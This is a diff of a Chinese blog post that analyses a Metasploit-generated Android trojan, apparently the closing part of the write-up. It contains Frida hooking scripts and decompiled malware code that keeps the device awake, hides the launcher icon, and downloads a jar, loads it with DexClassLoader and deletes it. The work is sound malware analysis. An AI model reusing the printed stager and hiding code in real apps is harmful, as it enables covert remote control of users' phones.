-            overloads[i].implementation = function () &#123;
-            console.log(&#39;\n&#39;)
-            console.warn(&quot;进入&quot; + classs.getName() + &quot;类的&quot; + methodsName + &quot;方法&quot;)
-            for(var j=0; j&lt;arguments.length; j++)&#123;
-                console.error(&quot;参数&quot; + j + &quot; =&gt; &quot; + arguments[j])
-            &#125;
-            if (arguments.length === 0) &#123;
-              console.log(&quot;该函数无参数&quot;);
-            &#125;
-            var result = this[methodsName].apply(this,arguments)
-            console.error(&quot;结果是 =&gt; &quot; + result)
-            return result;
-            &#125;;
-        &#125;
-    &#125;)
-    console.log(&#39;\n&#39;)
-&#125;)
-&#125;
-function main()&#123;
-    try &#123;
-        hookClass(&quot;com.metasploit.stage.b&quot;)
-    &#125;catch (e) &#123;
-        console.log(&quot;没有找到该类&quot;)
-    &#125;
-&#125;
- 
-setImmediate(main)
-</code></pre>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">logInf</span>(<span class="params">classs</span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="title class_">Modifier</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.metasploit.stage.b&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> modifiers = classs.<span class="title function_">getModifiers</span>();</span><br><span class="line">        classs.<span class="title function_">setAccessible</span>(<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="title class_">Modifier</span>.<span class="title function_">isStatic</span>(modifiers)) &#123;</span><br><span class="line">            <span class="comment">// 静态字段</span></span><br><span class="line">            <span class="keyword">var</span> value = classs.<span class="title function_">get</span>(<span class="literal">null</span>);</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(classs + <span class="string">&quot; =&gt;&quot;</span>  + value)</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">             <span class="variable language_">console</span>.<span class="title function_">log</span>(classs)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getAllsonClass</span>(<span class="params">classs</span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;查询到子类  =&gt;&quot;</span> + classs.<span class="title function_">getName</span>())</span><br><span class="line">    <span class="title function_">hookClass</span>(<span class="title class_">String</span>(classs.<span class="title function_">getName</span>()))</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> thisclass = <span class="literal">null</span>;</span><br><span class="line"><span class="comment">//&quot;java.security.MessageDigest&quot;</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hookClass</span>(<span class="params">CLASS</span>)&#123;</span><br><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> classStudent = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="variable constant_">CLASS</span>);</span><br><span class="line">    <span class="keyword">var</span> classs = classStudent.<span class="property">class</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">//获取所有内部类</span></span><br><span class="line">    <span class="keyword">var</span> innerClasses = classs.<span class="title function_">getDeclaredClasses</span>();</span><br><span class="line">    <span class="keyword">if</span>(innerClasses.<span class="property">length</span> &gt; <span class="number">0</span>)&#123;</span><br><span class="line">        innerClasses.<span class="title function_">forEach</span>(getAllsonClass);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;===========&quot;</span> + classs + <span class="string">&quot;中的所有变量==============&quot;</span>)</span><br><span class="line">    <span class="comment">//输出所有变量</span></span><br><span class="line">    classs.<span class="title function_">getDeclaredFields</span>().<span class="title function_">forEach</span>(logInf)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;===========&quot;</span> + classs +  <span class="string">&quot;的所有方法==============&quot;</span>)</span><br><span class="line">    <span class="comment">//输出所有方法,并hook</span></span><br><span class="line">    classs.<span class="title function_">getDeclaredMethods</span>().<span class="title function_">forEach</span>(<span class="keyword">function</span>(<span class="params">method</span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(method)</span><br><span class="line">       <span class="keyword">var</span> methodsName = method.<span class="title function_">getName</span>();</span><br><span class="line">       <span class="keyword">var</span> overloads  = classStudent[methodsName].<span class="property">overloads</span>;</span><br><span class="line">    <span class="comment">//    console.log(overloads.length)</span></span><br><span class="line">       <span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">0</span>; i&lt; overloads.<span class="property">length</span>; i++)&#123;</span><br><span class="line">            overloads[i].<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">warn</span>(<span class="string">&quot;进入&quot;</span> + classs.<span class="title function_">getName</span>() + <span class="string">&quot;类的&quot;</span> + methodsName + <span class="string">&quot;方法&quot;</span>)</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">var</span> j=<span class="number">0</span>; j&lt;<span class="variable language_">arguments</span>.<span class="property">length</span>; j++)&#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&quot;参数&quot;</span> + j + <span class="string">&quot; =&gt; &quot;</span> + <span class="variable language_">arguments</span>[j])</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable language_">arguments</span>.<span class="property">length</span> === <span class="number">0</span>) &#123;</span><br><span class="line">              <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;该函数无参数&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">var</span> result = <span class="variable language_">this</span>[methodsName].<span class="title function_">apply</span>(<span class="variable language_">this</span>,<span class="variable language_">arguments</span>)</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&quot;结果是 =&gt; &quot;</span> + result)</span><br><span class="line">            <span class="keyword">return</span> result;</span><br><span class="line">            &#125;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="title function_">hookClass</span>(<span class="string">&quot;com.metasploit.stage.b&quot;</span>)</span><br><span class="line">    &#125;<span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;没有找到该类&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="title function_">setImmediate</span>(main)</span><br></pre></td></tr></table></figure>
 <p>可以看到两个比较关键的结果：</p>
-<p><img src="/2024/03/28/msf-Android%E9%A9%AC%E5%88%86%E6%9E%90/image-20240424154214031.png" alt="image-20240424154214031"></p>
-<p><img src="/2024/03/28/msf-Android%E9%A9%AC%E5%88%86%E6%9E%90/image-20240424154229414.png" alt="image-20240424154229414"></p>
-<p>即，这里的payload就是msf马生成的信息部分，在b函数中还原出信息并添加生成一个http request包</p>
-<h6 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h6><pre><code class="java">if((v6.a &amp; 4) != 0 &amp;&amp; Payload.b != null) &#123;
-    PowerManager.WakeLock v0 = ((PowerManager)Payload.b.getSystemService(&quot;power&quot;)).newWakeLock(1, Payload.class.getSimpleName());
-    v0.acquire();
-    v1 = v0;
-&#125;
-</code></pre>
+<p><img loading="lazy" data-src="msf-Android%E9%A9%AC%E5%88%86%E6%9E%90/image-20240424154214031.png" alt="image-20240424154214031"></p>
+<p><img loading="lazy" data-src="msf-Android%E9%A9%AC%E5%88%86%E6%9E%90/image-20240424154229414.png" alt="image-20240424154229414"></p>
+<p>即，这里的 payload 就是 msf 马生成的信息部分，在 b 函数中还原出信息并添加生成一个 http request 包</p>
+<h6 id="payload-2"><a class="markdownIt-Anchor" href="#payload-2">#</a> payload</h6>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>((v6.a &amp; <span class="number">4</span>) != <span class="number">0</span> &amp;&amp; Payload.b != <span class="literal">null</span>) &#123;</span><br><span class="line">    PowerManager.<span class="type">WakeLock</span> <span class="variable">v0</span> <span class="operator">=</span> ((PowerManager)Payload.b.getSystemService(<span class="string">&quot;power&quot;</span>)).newWakeLock(<span class="number">1</span>, Payload.class.getSimpleName());</span><br><span class="line">    v0.acquire();</span><br><span class="line">    v1 = v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <ul>
-<li>这里创建了一个 <code>WakeLock</code> 对象 <code>v0</code>，它允许应用程序保持设备唤醒状态，这里通过 <code>Payload.b.getSystemService(&quot;power&quot;)</code> 获取了系统服务 <code>power</code>，并将其转换为 <code>PowerManager</code> 对象。然后调用 <code>newWakeLock(1, Payload.class.getSimpleName())</code> 方法创建了一个 <code>WakeLock</code> 对象，参数 <code>1</code> 表示创建的 <code>WakeLock</code> 类型是 <code>PARTIAL_WAKE_LOCK</code>，即部分唤醒锁定，它允许CPU继续运行，但允许屏幕和其他系统资源关闭。</li>
+<li>这里创建了一个  <code>WakeLock</code>  对象  <code>v0</code> ，它允许应用程序保持设备唤醒状态，这里通过  <code>Payload.b.getSystemService(&quot;power&quot;)</code>  获取了系统服务  <code>power</code> ，并将其转换为  <code>PowerManager</code>  对象。然后调用  <code>newWakeLock(1, Payload.class.getSimpleName())</code>  方法创建了一个  <code>WakeLock</code>  对象，参数  <code>1</code>  表示创建的  <code>WakeLock</code>  类型是  <code>PARTIAL_WAKE_LOCK</code> ，即部分唤醒锁定，它允许 CPU 继续运行，但允许屏幕和其他系统资源关闭。</li>
 </ul>
-<pre><code class="java">private static void a() &#123;
-    if(Payload.b != null) &#123;
-        String v1 = Payload.b.getPackageName();
-        PackageManager v2 = Payload.b.getPackageManager();
-        Intent v0 = new Intent(&quot;android.intent.action.MAIN&quot;, null);
-        v0.addCategory(&quot;android.intent.category.LAUNCHER&quot;);
-        for(Object v0_1: v2.queryIntentActivities(v0, 0)) &#123;
-            ResolveInfo v0_2 = (ResolveInfo)v0_1;
-            if(!v1.equals(v0_2.activityInfo.packageName)) &#123;
-                continue;
-            &#125;
-            v2.setComponentEnabledSetting(new ComponentName(v1, v0_2.activityInfo.name), 2, 1);
-        &#125;
-    &#125;
-&#125;
-</code></pre>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">a</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span>(Payload.b != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">v1</span> <span class="operator">=</span> Payload.b.getPackageName();</span><br><span class="line">        <span class="type">PackageManager</span> <span class="variable">v2</span> <span class="operator">=</span> Payload.b.getPackageManager();</span><br><span class="line">        <span class="type">Intent</span> <span class="variable">v0</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>(<span class="string">&quot;android.intent.action.MAIN&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        v0.addCategory(<span class="string">&quot;android.intent.category.LAUNCHER&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span>(Object v0_1: v2.queryIntentActivities(v0, <span class="number">0</span>)) &#123;</span><br><span class="line">            <span class="type">ResolveInfo</span> <span class="variable">v0_2</span> <span class="operator">=</span> (ResolveInfo)v0_1;</span><br><span class="line">            <span class="keyword">if</span>(!v1.equals(v0_2.activityInfo.packageName)) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            v2.setComponentEnabledSetting(<span class="keyword">new</span> <span class="title class_">ComponentName</span>(v1, v0_2.activityInfo.name), <span class="number">2</span>, <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <ul>
-<li>实现了禁用启动器图标，与上文callback可以隐匿在后台刷新</li>
+<li>实现了禁用启动器图标，与上文 callback 可以隐匿在后台刷新</li>
 </ul>
-<p>下面一段是进行基础的tcp解包，不需要讲，后面可以直接抓包看行为</p>
-<pre><code class="java">private static void a(DataInputStream arg11, OutputStream arg12, Object[] arg13) &#123;
-    if(Payload.e == null) &#123;
-        String v0 = (String)arg13[0];
-        String v1 = v0 + File.separatorChar + Integer.toString(new Random().nextInt(0x7FFFFFFF), 36);
-        String v2 = v1 + &quot;.jar&quot;;
-        String v3 = new String(Payload.a(arg11));
-        byte[] v4 = Payload.a(arg11);
-        File v5 = new File(v2);
-        if(!v5.exists()) &#123;
-            v5.createNewFile();
-        &#125;
-
-        FileOutputStream v6 = new FileOutputStream(v5);
-        v6.write(v4);
-        v6.flush();
-        v6.close();
-        Class v0_1 = new DexClassLoader(v2, v0, v0, Payload.class.getClassLoader()).loadClass(v3);
-        Object v2_1 = v0_1.newInstance();
-        v5.delete();
-        new File(v1 + &quot;.dex&quot;).delete();
-        v0_1.getMethod(&quot;start&quot;, DataInputStream.class, OutputStream.class, Object[].class).invoke(v2_1, arg11, arg12, arg13);
-    &#125;
-    else &#123;
-        Payload.class.getClassLoader().loadClass(Payload.e).getConstructor(DataInputStream.class, OutputStream.class, Object[].class, Boolean.TYPE).newInstance(arg11, arg12, arg13, Boolean.valueOf(false));
-    &#125;
-
-    Payload.c = -1L;
-&#125;
-</code></pre>
+<p>下面一段是进行基础的 tcp 解包，不需要讲，后面可以直接抓包看行为</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">a</span><span class="params">(DataInputStream arg11, OutputStream arg12, Object[] arg13)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span>(Payload.e == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">v0</span> <span class="operator">=</span> (String)arg13[<span class="number">0</span>];</span><br><span class="line">        <span class="type">String</span> <span class="variable">v1</span> <span class="operator">=</span> v0 + File.separatorChar + Integer.toString(<span class="keyword">new</span> <span class="title class_">Random</span>().nextInt(<span class="number">0x7FFFFFFF</span>), <span class="number">36</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">v2</span> <span class="operator">=</span> v1 + <span class="string">&quot;.jar&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">v3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(Payload.a(arg11));</span><br><span class="line">        <span class="type">byte</span>[] v4 = Payload.a(arg11);</span><br><span class="line">        <span class="type">File</span> <span class="variable">v5</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(v2);</span><br><span class="line">        <span class="keyword">if</span>(!v5.exists()) &#123;</span><br><span class="line">            v5.createNewFile();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">v6</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(v5);</span><br><span class="line">        v6.write(v4);</span><br><span class="line">        v6.flush();</span><br><span class="line">        v6.close();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">v0_1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DexClassLoader</span>(v2, v0, v0, Payload.class.getClassLoader()).loadClass(v3);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">v2_1</span> <span class="operator">=</span> v0_1.newInstance();</span><br><span class="line">        v5.delete();</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">File</span>(v1 + <span class="string">&quot;.dex&quot;</span>).delete();</span><br><span class="line">        v0_1.getMethod(<span class="string">&quot;start&quot;</span>, DataInputStream.class, OutputStream.class, Object[].class).invoke(v2_1, arg11, arg12, arg13);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        Payload.class.getClassLoader().loadClass(Payload.e).getConstructor(DataInputStream.class, OutputStream.class, Object[].class, Boolean.TYPE).newInstance(arg11, arg12, arg13, Boolean.valueOf(<span class="literal">false</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Payload.c = -<span class="number">1L</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>这里很明显动态生成了文件，并反射运行其中的部分内容，相同的方法抓取方法返回值和参数，可以拿到：</p>
-<p><img src="/2024/03/28/msf-Android%E9%A9%AC%E5%88%86%E6%9E%90/image-20240424161446827.png" alt="image-20240424161446827"></p>
-<p>反射运行了这个方法，这里仍旧是一个loader</p>
-<p><img src="/2024/03/28/msf-Android%E9%A9%AC%E5%88%86%E6%9E%90/image-20240424160834420.png" alt="image-20240424160834420"></p>
-<p><img src="/2024/03/28/msf-Android%E9%A9%AC%E5%88%86%E6%9E%90/image-20240424160846551.png" alt="image-20240424160846551"></p>
-<p>那么这里就需要获得里面的<code>met.jar</code>，有点缺乏经验不知道怎么搞（这里需要清楚，frida去hook的是app内所有的内容，即使loader加载的也不例外），不过询问了一下可以去hook <code>File.delete</code>，然后去找文件</p>
-<pre><code class="javascript">setImmediate(function()&#123;
-    console.log(&quot;lld [*]&quot;);
-    Java.perform(function()&#123;
-        var myClass = Java.use(&quot;java.io.File&quot;);
-        myClass.delete.implementation = function()&#123;
-            // var ret = this.onStartCommand();
-            console.log(&quot;delete hooked&quot;);
-        &#125;
-    &#125;)
-&#125;)
-</code></pre>
-<p><img src="/2024/03/28/msf-Android%E9%A9%AC%E5%88%86%E6%9E%90/image-20240424190256641.png" alt="image-20240424190256641"></p>
-<p>这frida确实有点好用的</p>
-<h5 id="met-jar"><a href="#met-jar" class="headerlink" title="met.jar"></a>met.jar</h5><p>根据刚才的分析，入口类就是这里的<code>com.metasploit.meterpreter.AndroidMeterpreter</code></p>
-<p><img src="/2024/03/28/msf-Android%E9%A9%AC%E5%88%86%E6%9E%90/image-20240424191136119.png" alt="image-20240424191136119"></p>
+<p><img loading="lazy" data-src="msf-Android%E9%A9%AC%E5%88%86%E6%9E%90/image-20240424161446827.png" alt="image-20240424161446827"></p>
+<p>反射运行了这个方法，这里仍旧是一个 loader</p>
+<p><img loading="lazy" data-src="msf-Android%E9%A9%AC%E5%88%86%E6%9E%90/image-20240424160834420.png" alt="image-20240424160834420"></p>
+<p><img loading="lazy" data-src="msf-Android%E9%A9%AC%E5%88%86%E6%9E%90/image-20240424160846551.png" alt="image-20240424160846551"></p>
+<p>那么这里就需要获得里面的 <code>met.jar</code> ，有点缺乏经验不知道怎么搞（这里需要清楚，frida 去 hook 的是 app 内所有的内容，即使 loader 加载的也不例外），不过询问了一下可以去 hook  <code>File.delete</code> ，然后去找文件</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">setImmediate</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;lld [*]&quot;</span>);</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> myClass = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.io.File&quot;</span>);</span><br><span class="line">        myClass.<span class="property">delete</span>.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">            <span class="comment">// var ret = this.onStartCommand();</span></span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;delete hooked&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
+<p><img loading="lazy" data-src="msf-Android%E9%A9%AC%E5%88%86%E6%9E%90/image-20240424190256641.png" alt="image-20240424190256641"></p>
+<p>这 frida 确实有点好用的</p>
+<h5 id="metjar"><a class="markdownIt-Anchor" href="#metjar">#</a> met.jar</h5>
+<p>根据刚才的分析，入口类就是这里的 <code>com.metasploit.meterpreter.AndroidMeterpreter</code></p>
+<p><img loading="lazy" data-src="msf-Android%E9%A9%AC%E5%88%86%E6%9E%90/image-20240424191136119.png" alt="image-20240424191136119"></p>
 <p>里面的马已经相当明文，就暂时不看了</p>
-
-    </div>
-    
-</div>
-                         
-<footer id="footer">
-    <div class="footer-wrap">
-        <div>
-            © 20xx - 2024 Moyao の小屋
-            <span class="footer-icon">
-                <i class="fa-solid fa-font-awesome fa-fw"></i>
-            </span>
-            @Moyao
-        </div>
-        <div></div>
-        <div>Based on the <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo Engine</a> & <a
-                target="_blank" rel="noopener" href="https://github.com/argvchs/hexo-theme-particlex">ParticleX Theme</a></div>
-        
-    </div>
-</footer>
-                    </div>
-                </div>
-            </transition>
-            <div id="img_show">
-                <img id="img_content" alt="img_show">
-            </div>
-        </div>
-        <script src="https://cdn.staticfile.org/highlight.js/11.5.1/highlight.min.js"></script>
-        <script src="/js/particlex.js"></script>
-        <script src="/js/showimg.js"></script>
-        
-
-    </body>
-</html>
+</div><footer><div class="meta"><span class="item"><span class="icon"><i class="ic i-calendar-check"></i></span><span class="text">Edited on</span><time title="Modified: 2024-04-24 19:17:55" itemprop="dateModified" datetime="2024-04-24T19:17:55+08:00">2024-04-24</time></span></div><div class="reward"><button><i class="ic i-heartbeat"></i>Donate</button><p>Give me a cup of [coffee]~(￣▽￣)~*</p><div id="qr"><div><img loading="lazy" data-src="/assets/wechatpay.png" alt="Moyao WeChat Pay"/><p>WeChat Pay</p></div><div><img loading="lazy" data-src="/assets/alipay.png" alt="Moyao Alipay"/><p>Alipay</p></div></div></div><div id="copyright"><ul><li class="author"><strong>Post author: </strong>Moyao<i class="ic i-at"><em>@</em></i>Moyao の小屋</li><li class="link"><strong>Post link: </strong><a href="https://demoyao100.github.io/2024/03/28/msf-Android%E9%A9%AC%E5%88%86%E6%9E%90/" title="msf Android马分析">https://demoyao100.github.io/2024/03/28/msf-Android马分析/</a></li><li class="license"><strong>Copyright Notice: </strong>All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</a> unless stating additionally.</li></ul></div></footer></article></div><div class="post-nav"><div class="item left"><a href="/2024/03/28/ACTF-flutter%E5%A4%8D%E7%8E%B0/" rel="prev" itemprop="url" data-background-image="https:&#x2F;&#x2F;tva4.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1gicit4jrvuj20zk0m8785.jpg" title="ACTF flutter复现"><span class="type">Previous Post</span><h3>ACTF flutter复现</h3></a></div><div class="item right"><a href="/2024/04/02/driver%E5%A4%8D%E7%8E%B0-%E9%93%81%E4%B8%892024/" rel="next" itemprop="url" data-background-image="https:&#x2F;&#x2F;tva4.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1gicit31ffoj20zk0m8naf.jpg" title="driver复现(铁三2024)"><span class="type">Next Post</span><h3>driver复现(铁三2024)</h3></a></div></div><div class="wrap" id="comments"></div></div><div id="sidebar"><div class="inner"><div class="panels"><div class="inner"><div class="contents panel pjax" data-title="Contents"><ol class="toc"><li class="toc-item toc-level-6"><a class="toc-link" href="#preface"><span class="toc-number">1.</span> <span class="toc-text"> PREFACE:</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80-%E8%BF%90%E8%A1%8C%E6%95%88%E6%9E%9C%E4%BB%A5%E5%8F%8A%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number"></span> <span class="toc-text"> 一、运行效果以及环境搭建</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C-%E9%80%86%E5%90%91%E5%88%86%E6%9E%90"><span class="toc-number"></span> <span class="toc-text"> 二、逆向分析</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#androidmainfestxml"><span class="toc-number"></span> <span class="toc-text"> AndroidMainfest.xml</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#mainservice"><span class="toc-number"></span> <span class="toc-text"> MainService</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#payload"><span class="toc-number"></span> <span class="toc-text"> Payload</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#class-b"><span class="toc-number">1.</span> <span class="toc-text"> class b</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#payload-2"><span class="toc-number">2.</span> <span class="toc-text"> payload</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#metjar"><span class="toc-number"></span> <span class="toc-text"> met.jar</span></a></div><div class="related panel pjax" data-title="Related"></div><div class="overview panel" data-title="Overview"><div class="author" itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><img class="image" loading="lazy" decoding="async" itemprop="image" alt="Moyao" src="/assets/avatar.jpg"/><p class="name" itemprop="name">Moyao</p><div class="description" itemprop="description">Write down something interesting I met
+feel free to mail me if you have something wanted to talk about
+mail: &lt;moyaoxue@outlook.com&gt;
